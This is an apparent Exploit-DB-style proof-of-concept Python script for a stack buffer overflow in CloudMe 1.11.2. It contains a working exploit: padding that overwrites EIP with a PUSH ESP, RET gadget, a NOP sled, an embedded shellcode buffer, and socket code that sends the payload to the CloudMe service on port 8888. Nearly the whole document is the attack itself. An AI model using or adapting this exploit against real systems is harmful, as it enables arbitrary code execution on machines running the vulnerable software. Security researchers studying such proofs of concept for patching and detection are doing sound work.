# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

buf =  b""
buf += b"\xbd\x43\xef\xaf\x72\xda\xda\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x52\x31\x68\x12\x03\x68\x12\x83\xab\x13\x4d"
buf += b"\x87\xd7\x04\x10\x68\x27\xd5\x75\xe0\xc2\xe4\xb5\x96"
buf += b"\x87\x57\x06\xdc\xc5\x5b\xed\xb0\xfd\xe8\x83\x1c\xf2"
buf += b"\x59\x29\x7b\x3d\x59\x02\xbf\x5c\xd9\x59\xec\xbe\xe0"
buf += b"\x91\xe1\xbf\x25\xcf\x08\xed\xfe\x9b\xbf\x01\x8a\xd6"
buf += b"\x03\xaa\xc0\xf7\x03\x4f\x90\xf6\x22\xde\xaa\xa0\xe4"
buf += b"\xe1\x7f\xd9\xac\xf9\x9c\xe4\x67\x72\x56\x92\x79\x52"
buf += b"\xa6\x5b\xd5\x9b\x06\xae\x27\xdc\xa1\x51\x52\x14\xd2"
buf += b"\xec\x65\xe3\xa8\x2a\xe3\xf7\x0b\xb8\x53\xd3\xaa\x6d"
buf += b"\x05\x90\xa1\xda\x41\xfe\xa5\xdd\x86\x75\xd1\x56\x29"
buf += b"\x59\x53\x2c\x0e\x7d\x3f\xf6\x2f\x24\xe5\x59\x4f\x36"
buf += b"\x46\x05\xf5\x3d\x6b\x52\x84\x1c\xe4\x97\xa5\x9e\xf4"
buf += b"\xbf\xbe\xed\xc6\x60\x15\x79\x6b\xe8\xb3\x7e\x8c\xc3"
buf += b"\x04\x10\x73\xec\x74\x39\xb0\xb8\x24\x51\x11\xc1\xae"
buf += b"\xa1\x9e\x14\x60\xf1\x30\xc7\xc1\xa1\xf0\xb7\xa9\xab"
buf += b"\xfe\xe8\xca\xd4\xd4\x80\x61\x2f\xbf\xa4\x7f\x21\x26"
buf += b"\xd1\x7d\x3d\x5d\x18\x0b\xdb\x37\x4a\x5d\x74\xa0\xf3"
buf += b"\xc4\x0e\x51\xfb\xd2\x6b\x51\x77\xd1\x8c\x1c\x70\x9c"
buf += b"\x9e\xc9\x70\xeb\xfc\x5c\x8e\xc1\x68\x02\x1d\x8e\x68"
buf += b"\x4d\x3e\x19\x3f\x1a\xf0\x50\xd5\xb6\xab\xca\xcb\x4a"
buf += b"\x2d\x34\x4f\x91\x8e\xbb\x4e\x54\xaa\x9f\x40\xa0\x33"
buf += b"\xa4\x34\x7c\x62\x72\xe2\x3a\xdc\x34\x5c\x95\xb3\x9e"
buf += b"\x08\x60\xf8\x20\x4e\x6d\xd5\xd6\xae\xdc\x80\xae\xd1"
buf += b"\xd1\x44\x27\xaa\x0f\xf5\xc8\x61\x94\x15\x2b\xa3\xe1"
buf += b"\xbd\xf2\x26\x48\xa0\x04\x9d\x8f\xdd\x86\x17\x70\x1a"
buf += b"\x96\x52\x75\x66\x10\x8f\x07\xf7\xf5\xaf\xb4\xf8\xdf"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + buf))

buff = padding1 + EIP + NOPS + buf + overrun

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buff)
except Exception as e:
	print(sys.exc_value)
